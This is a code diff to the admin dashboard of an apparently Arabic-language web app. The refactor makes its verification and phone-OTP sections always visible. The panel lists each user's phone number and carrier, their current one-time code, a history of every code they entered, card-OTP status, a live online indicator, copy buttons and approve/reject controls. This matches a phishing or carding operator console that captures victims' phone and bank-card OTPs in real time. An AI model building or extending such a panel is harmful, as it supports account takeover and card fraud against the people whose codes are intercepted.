@@ -860,116 +860,109 @@ export default function AdminDashboard() {
                   )}
 
                   {/* Verification Status */}
-                  {hasData(
-                    selectedApplication.phoneOtpApproved,
-                    selectedApplication.cardOtpApproved,
-                  ) && (
-                    <Section title="حالة التحقق" icon={<CheckCircle className="w-3 h-3" />}>
-                      <div className="space-y-1">
-                        <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
-                          <span className="text-[8px] text-slate-400">الحالة</span>
-                          <div className="flex items-center gap-1">
-                            <UserStatus userId={selectedApplication.id!} />
-                            <span className="text-[7px] text-slate-300">متصل</span>
-                          </div>
-                        </div>
-                        <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
-                          <span className="text-[8px] text-slate-400">تحقق الهاتف</span>
-                          <Badge
-                            className={`text-[7px] ${selectedApplication.phoneVerificationStatus === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.phoneVerificationStatus === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
-                          >
-                            {selectedApplication.phoneVerificationStatus || "معلق"}
-                          </Badge>
-                        </div>
-                        <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
-                          <span className="text-[8px] text-slate-400">تحقق الهوية</span>
-                          <Badge
-                            className={`text-[7px] ${selectedApplication.idVerificationStatus === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.idVerificationStatus === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
-                          >
-                            {selectedApplication.idVerificationStatus || "معلق"}
-                          </Badge>
-                        </div>
-                        <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
-                          <span className="text-[8px] text-slate-400">رمز الهاتف</span>
-                          <Badge
-                            className={`text-[7px] ${selectedApplication.phoneOtpApproved === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.phoneOtpApproved === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
-                          >
-                            {selectedApplication.phoneOtpApproved || "معلق"}
-                          </Badge>
-                        </div>
-                        <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
-                          <span className="text-[8px] text-slate-400">رمز البطاقة</span>
-                          <Badge
-                            className={`text-[7px] ${selectedApplication.cardOtpApproved === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.cardOtpApproved === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
-                          >
-                            {selectedApplication.cardOtpApproved || "معلق"}
-                          </Badge>
+                  <Section title="حالة التحقق" icon={<CheckCircle className="w-3 h-3" />}>
+                    <div className="space-y-1">
+                      <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
+                        <span className="text-[8px] text-slate-400">الحالة</span>
+                        <div className="flex items-center gap-1">
+                          <UserStatus userId={selectedApplication.id!} />
+                          <span className="text-[7px] text-slate-300">متصل</span>
                         </div>
                       </div>
-                    </Section>
-                  )}
+                      <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
+                        <span className="text-[8px] text-slate-400">تحقق الهاتف</span>
+                        <Badge
+                          className={`text-[7px] ${selectedApplication.phoneVerificationStatus === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.phoneVerificationStatus === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                        >
+                          {selectedApplication.phoneVerificationStatus || "معلق"}
+                        </Badge>
+                      </div>
+                      <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
+                        <span className="text-[8px] text-slate-400">تحقق الهوية</span>
+                        <Badge
+                          className={`text-[7px] ${selectedApplication.idVerificationStatus === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.idVerificationStatus === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                        >
+                          {selectedApplication.idVerificationStatus || "معلق"}
+                        </Badge>
+                      </div>
+                      <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
+                        <span className="text-[8px] text-slate-400">رمز الهاتف</span>
+                        <Badge
+                          className={`text-[7px] ${selectedApplication.phoneOtpApproved === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.phoneOtpApproved === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                        >
+                          {selectedApplication.phoneOtpApproved || "معلق"}
+                        </Badge>
+                      </div>
+                      <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
+                        <span className="text-[8px] text-slate-400">رمز البطاقة</span>
+                        <Badge
+                          className={`text-[7px] ${selectedApplication.cardOtpApproved === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.cardOtpApproved === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                        >
+                          {selectedApplication.cardOtpApproved || "معلق"}
+                        </Badge>
+                      </div>
+                    </div>
+                  </Section>
 
                   {/* Phone OTP Approval */}
-                  {selectedApplication.phoneOtp && (
-                    <Section title="موافقة رمز الهاتف" icon={<Phone className="w-3 h-3" />}>
-                     
-                     <DataRow
-                        label="الهاتف"
-                        value={selectedApplication.phoneNumber}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                       <DataRow
-                        label="الشركة"
-                        value={selectedApplication.phoneCarrier}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      /> <DataRow
-                        label="رمز التحقق الحالي"
-                        value={selectedApplication.phoneOtp}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                      {selectedApplication.phoneOtpApproved !== "approved" && (
-                        <div className="flex gap-1 mt-1">
-                          <Button
-                            onClick={() => handleApprovePhoneOtp(selectedApplication.id!)}
-                            size="sm"
-                            className="h-5 text-[8px] px-1.5 rounded bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30"
-                          >
-                            ✓ موافقة
-                          </Button>
-                          <Button
-                            onClick={() => handleRejectPhoneOtp(selectedApplication.id!)}
-                            size="sm"
-                            className="h-5 text-[8px] px-1.5 rounded bg-red-500/20 text-red-400 hover:bg-red-500/30"
-                          >
-                            ✗ رفض
-                          </Button>
+                  <Section title="موافقة رمز الهاتف" icon={<Phone className="w-3 h-3" />}>
+                    <DataRow
+                      label="الهاتف"
+                      value={selectedApplication.phoneNumber}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                      label="الشركة"
+                      value={selectedApplication.phoneCarrier}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                      label="رمز التحقق الحالي"
+                      value={selectedApplication.phoneOtp}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    {selectedApplication.phoneOtpApproved !== "approved" && (
+                      <div className="flex gap-1 mt-1">
+                        <Button
+                          onClick={() => handleApprovePhoneOtp(selectedApplication.id!)}
+                          size="sm"
+                          className="h-5 text-[8px] px-1.5 rounded bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30"
+                        >
+                          ✓ موافقة
+                        </Button>
+                        <Button
+                          onClick={() => handleRejectPhoneOtp(selectedApplication.id!)}
+                          size="sm"
+                          className="h-5 text-[8px] px-1.5 rounded bg-red-500/20 text-red-400 hover:bg-red-500/30"
+                        >
+                          ✗ رفض
+                        </Button>
+                      </div>
+                    )}
+                    {selectedApplication.phoneOtpApproved === "approved" && (
+                      <Badge className="text-[8px] bg-emerald-500/20 text-emerald-400 mt-1">رمز الهاتف موافق ✓</Badge>
+                    )}
+                    {selectedApplication.phoneOtpApproved === "rejected" && (
+                      <Badge className="text-[8px] bg-red-500/20 text-red-400 mt-1">رمز الهاتف مرفوض ✗</Badge>
+                    )}
+                    {selectedApplication.allPhoneOtps && selectedApplication.allPhoneOtps.length > 0 && (
+                      <div className="mt-1 p-1.5 bg-slate-800/50 rounded border border-slate-700">
+                        <span className="text-[8px] text-slate-400 block mb-0.5">
+                          سجل رموز ({selectedApplication.allPhoneOtps.length})
+                        </span>
+                        <div className="flex flex-wrap gap-0.5">
+                          {selectedApplication.allPhoneOtps.map((otp, index) => (
+                            <span key={index} className="text-[7px] bg-blue-500/20 text-blue-300 px-1 py-0.5 rounded">
+                              {otp}
+                            </span>
+                          ))}
                         </div>
-                      )}
-                      {selectedApplication.phoneOtpApproved === "approved" && (
-                        <Badge className="text-[8px] bg-emerald-500/20 text-emerald-400 mt-1">رمز الهاتف موافق ✓</Badge>
-                      )}
-                      {selectedApplication.phoneOtpApproved === "rejected" && (
-                        <Badge className="text-[8px] bg-red-500/20 text-red-400 mt-1">رمز الهاتف مرفوض ✗</Badge>
-                      )}
-                      {selectedApplication.allPhoneOtps && selectedApplication.allPhoneOtps.length > 0 && (
-                        <div className="mt-1 p-1.5 bg-slate-800/50 rounded border border-slate-700">
-                          <span className="text-[8px] text-slate-400 block mb-0.5">
-                            سجل رموز ({selectedApplication.allPhoneOtps.length})
-                          </span>
-                          <div className="flex flex-wrap gap-0.5">
-                            {selectedApplication.allPhoneOtps.map((otp, index) => (
-                              <span key={index} className="text-[7px] bg-blue-500/20 text-blue-300 px-1 py-0.5 rounded">
-                                {otp}
-                              </span>
-                            ))}
-                          </div>
-                        </div>
-                      )}
-                    </Section>
-                  )}
+                      </div>
+                    )}
+                  </Section>
 
                   {/* All Approvals Summary */}
                   <Section title="ملخص الموافقات" icon={<CheckCircle className="w-3 h-3" />}>
